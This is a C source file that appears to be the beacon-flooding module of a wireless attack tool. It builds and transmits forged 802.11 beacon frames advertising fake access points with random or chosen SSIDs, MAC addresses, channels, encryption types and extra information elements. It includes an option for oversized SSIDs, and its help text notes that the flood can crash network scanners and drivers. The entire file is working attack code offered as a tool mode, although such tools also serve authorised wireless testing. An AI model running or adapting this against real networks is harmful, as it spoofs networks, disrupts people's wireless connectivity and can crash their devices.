#include <stdio.h>
#include <string.h>
#include <inttypes.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

#include "beacon_flood.h"
#include "../osdep.h"
#include "../helpers.h"

#define BEACON_FLOOD_MODE 'b'
#define BEACON_FLOOD_NAME "Beacon Flooding"

struct beacon_flood_options {
  char *ssid;
  char *ssid_filename;
  char *mac_ssid_filename;
  unsigned char all_chars;
  unsigned char type;
  char encryptions[5];
  char bitrates;
  unsigned char validapmac;
  unsigned char hopto;
  uint8_t channel;
  uint8_t use_channel;
  unsigned int speed;
  unsigned char *ies;
  int ies_len;
};

//Global things, shared by packet creation and stats printing
char *ssid = NULL;
struct ether_addr bssid;
int curchan = 0;

void beacon_flood_shorthelp()
{
  printf("  Sends beacon frames to show fake APs at clients.\n");
  printf("  This can sometimes crash network scanners and even drivers!\n");
}

void beacon_flood_longhelp()
{
  printf( "  Sends beacon frames to generate fake APs at clients.\n"
	  "  This can sometimes crash network scanners and drivers!\n"
	  "      -n <ssid>\n"
	  "         Use SSID <ssid> instead of randomly generated ones\n"
	  "      -a\n"
	  "         Use also non-printable caracters in generated SSIDs\n"
	  "         and create SSIDs that break the 32-byte limit\n"
	  "      -f <filename>\n"
	  "         Read SSIDs from file\n"
	  "      -v <filename>\n"
	  "         Read MACs and SSIDs from file. See example file!\n"
	  "      -t <adhoc>\n"
	  "         -t 1 = Create only Ad-Hoc network\n"
	  "         -t 0 = Create only Managed (AP) networks\n"
	  "         without this option, both types are generated\n"
	  "      -w <encryptions>\n"
	  "         Select which type of encryption the fake networks shall have\n"
	  "         Valid options: n = No Encryption, w = WEP, t = TKIP (WPA), a = AES (WPA2)\n"
	  "         You can select multiple types, i.e. \"-w wta\" will only create WEP and WPA networks\n" 
	  "      -b <bitrate>\n"
	  "         Select if 11 Mbit (b) or 54 MBit (g) networks are created\n"
	  "         Without this option, both types will be used.\n"
	  "      -m\n"
	  "         Use valid accesspoint MAC from built-in OUI database\n"
	  "      -h\n"
	  "         Hop to channel where network is spoofed\n"
	  "         This is more effective with some devices/drivers\n"
	  "         But it reduces packet rate due to channel hopping.\n"
	  "      -c <chan>\n"
	  "         Create fake networks on channel <chan>. If you want your card to\n"
	  "         hop on this channel, you have to set -h option, too.\n"
	  "      -i <HEX>\n"
	  "         Add user-defined IE(s) in hexadecimal at the end of the tagged parameters\n"
	  "      -s <pps>\n"
	  "         Set speed in packets per second (Default: 50)\n");
}

void *beacon_flood_parse(int argc, char *argv[]) {
  int opt, ch;
  unsigned int i;
  struct beacon_flood_options *bopt = malloc(sizeof(struct beacon_flood_options));
  
  bopt->ssid = NULL;
  bopt->ssid_filename = NULL;
  bopt->mac_ssid_filename = NULL;
  bopt->all_chars = 0;
  bopt->type = 2;
  strcpy(bopt->encryptions, "nwta");
  bopt->bitrates = 'a';
  bopt->validapmac = 0;
  bopt->hopto = 0;
  bopt->channel = 0;
  bopt->use_channel = 0;
  bopt->speed = 50;
  bopt->ies = NULL;
  bopt->ies_len = 0;
  
  while ((opt = getopt(argc, argv, "n:f:av:t:w:b:mhc:s:i:")) != -1) {
    switch (opt) {
      case 'n':
	if (strlen(optarg) > 255) {
	  printf("ERROR: SSID too long\n"); return NULL;
	} else if (strlen(optarg) > 32) {
	  printf("NOTE: Using Non-Standard SSID with length > 32\n");
	}
	if (bopt->ssid_filename || bopt->mac_ssid_filename || bopt->all_chars) {
	  printf("Only one of -n -a -f or -v may be selected\n"); return NULL; }
	bopt->ssid = malloc(strlen(optarg) + 1); strcpy(bopt->ssid, optarg);
      break;
      case 'f':
	if (bopt->ssid || bopt->mac_ssid_filename || bopt->all_chars) {
	  printf("Only one of -n -a -f or -v may be selected\n"); return NULL; }
	bopt->ssid_filename = malloc(strlen(optarg) + 1); strcpy(bopt->ssid_filename, optarg);
      break;
      case 'v':
	if (bopt->ssid_filename || bopt->ssid || bopt->all_chars) {
	  printf("Only one of -n -a -f or -v may be selected\n"); return NULL; }
	bopt->mac_ssid_filename = malloc(strlen(optarg) + 1); strcpy(bopt->mac_ssid_filename, optarg);
      break;
      case 'a':
	if (bopt->ssid_filename || bopt->ssid || bopt->mac_ssid_filename) {
	  printf("Only one of -n -a -f or -v may be selected\n"); return NULL; }
	bopt->all_chars = 1;
      break;
      case 't':
	if (! strcmp(optarg, "1")) bopt->type = 1;
	else if (! strcmp(optarg, "0")) bopt->type = 0;
	else { beacon_flood_longhelp(); printf("\n\nInvalid -t option\n"); return NULL; }
      break;
      case 'w':
	if ((strlen(optarg) > 4) || (strlen(optarg) < 1)) {
	  beacon_flood_longhelp(); printf("\n\nInvalid -w option\n"); return NULL; }
	for(i=0; i<strlen(optarg); i++) {
	  if ((optarg[i] != 'w') && (optarg[i] != 'n') && (optarg[i] != 't') && (optarg[i] != 'a')) {
	    beacon_flood_longhelp(); printf("\n\nInvalid -w option\n"); return NULL; }
	}
	memset(bopt->encryptions, 0x00, 5);
	strcpy(bopt->encryptions, optarg);
      break;
      case 'b':
	if (! strcmp(optarg, "b")) bopt->bitrates = 'b';
	else if (! strcmp(optarg, "g")) bopt->bitrates = 'g';
	else { beacon_flood_longhelp(); printf("\n\nInvalid -b option\n"); return NULL; }
      break;
      case 'm':
	bopt->validapmac = 1;
      break;
      case 'h':
	bopt->hopto = 1;
      break;
      case 'c':
	ch = atoi(optarg);
	//As far as you can put any byte in the frame's channel field, every possible 8bit value is "valid" ;)
	if ((ch < 0) || (ch > 255)) { printf("\n\nInvalid channel\n"); return NULL; }
	bopt->channel = (uint8_t) ch;
	bopt->use_channel = 1;
      break;
      case 's':
	bopt->speed = (unsigned int) atoi(optarg);
      break;
      case 'i':
	bopt->ies = hex2bin(optarg, &(bopt->ies_len));
      break;
      default:
	beacon_flood_longhelp();
	printf("\n\nUnknown option %c\n", opt);
	return NULL;
    }
  }
  
  return (void *) bopt;
}


struct packet beacon_flood_getpacket(void *options) {
  struct beacon_flood_options *bopt = (struct beacon_flood_options *) options;
  struct packet pkt;
  static unsigned int packsent = 0, encindex;
  static time_t t_prev = 0;
  static int freessid = 0, freeline = 0;
  unsigned char bitrate, adhoc;
  static char *line = NULL;
  
  if (bopt->hopto) {
    packsent++;
    if ((packsent == 50) || ((time(NULL) - t_prev) >= 3)) {
      // Switch Channel every 50 frames or 3 seconds
      packsent = 0; t_prev = time(NULL);
      if (bopt->use_channel) curchan = (int) bopt->channel;
      else curchan = (int) generate_channel();
      osdep_set_channel(curchan);
    }
  } else if (bopt->use_channel) {
    curchan = bopt->channel;
  } else {
    curchan = (int) generate_channel();
  }

  if (bopt->validapmac) bssid = generate_mac(MAC_KIND_AP);
  else bssid = generate_mac(MAC_KIND_RANDOM);

  if (freessid && ssid) free(ssid);	//We need to keep those just before we change them
  if (freeline && line) free(line);	//To print SSID in print_stats!
  if (bopt->ssid) {
    ssid = bopt->ssid;
  } else if (bopt->ssid_filename) {
    do { ssid = read_next_line(bopt->ssid_filename, 0); } while (ssid == NULL);
    freessid = 1;
  } else if (bopt->mac_ssid_filename) {
    do {
      do { line = read_next_line(bopt->mac_ssid_filename, 0); } while (line == NULL);
      ssid = strchr(line, ' ');
      bssid = parse_mac(line);
      if (! ssid) { printf("Skipping malformed line: %s\n", line); free(line); }
      else ssid++; //Skip the whitespace
      freeline = 1;
    } while (ssid == NULL);
  } else {
    ssid = generate_ssid(bopt->all_chars);
    freessid = 1;
  }
  
  encindex = random() % strlen(bopt->encryptions);
  
  if (bopt->bitrates == 'a') {
    if (random() % 2) bitrate = 11;
    else bitrate = 54;
  } else if (bopt->bitrates == 'b') {
    bitrate = 11;
  } else {
    bitrate = 54;
  }
  
  if (bopt->type == 2) {
    if (random() % 2) adhoc = 0;
    else adhoc = 1;
  } else if (bopt->type == 1) {
    adhoc = 1;
  } else {
    adhoc = 0;
  }
  
  pkt = create_beacon(bssid, ssid, (uint8_t) curchan, bopt->encryptions[encindex], bitrate, adhoc);
  if (bopt->ies) append_data(&pkt, bopt->ies, bopt->ies_len);
  
  sleep_till_next_packet(bopt->speed);
  return pkt;
}

void beacon_flood_print_stats(void *options) {
  struct beacon_flood_options *bopt = (struct beacon_flood_options *) options;
  
  printf("\rCurrent MAC: "); print_mac(bssid);
  if (bopt->all_chars) {
    printf(" on Channel %2d              \n", curchan);
  } else {
    printf(" on Channel %2d with SSID: %s\n", curchan, ssid);
  }
}

void beacon_flood_perform_check(void *options) {
  //Nothing to check for beacon flooding attacks
  options = options; //Avoid unused warning
}

struct attacks load_beacon_flood() {
  struct attacks this_attack;
  char *beacon_flood_name = malloc(strlen(BEACON_FLOOD_NAME) + 1);
  strcpy(beacon_flood_name, BEACON_FLOOD_NAME);

  this_attack.print_shorthelp = (fp) beacon_flood_shorthelp;
  this_attack.print_longhelp = (fp) beacon_flood_longhelp;
  this_attack.parse_options = (fpo) beacon_flood_parse;
  this_attack.get_packet = (fpp) beacon_flood_getpacket;
  this_attack.print_stats = (fps) beacon_flood_print_stats;
  this_attack.perform_check = (fps) beacon_flood_perform_check;
  this_attack.mode_identifier = BEACON_FLOOD_MODE;
  this_attack.attack_name = beacon_flood_name;

  return this_attack;
}